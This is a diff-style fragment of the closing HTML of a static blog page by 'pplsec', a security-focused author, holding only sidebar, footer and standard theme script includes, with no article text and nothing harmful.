+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/ppl.jpg" alt="pplsec">
+            
+              <p class="site-author-name" itemprop="name">pplsec</p>
+              <p class="site-description motion-element" itemprop="description">渗透测试 应急响应 代码审计</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">pplsec</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
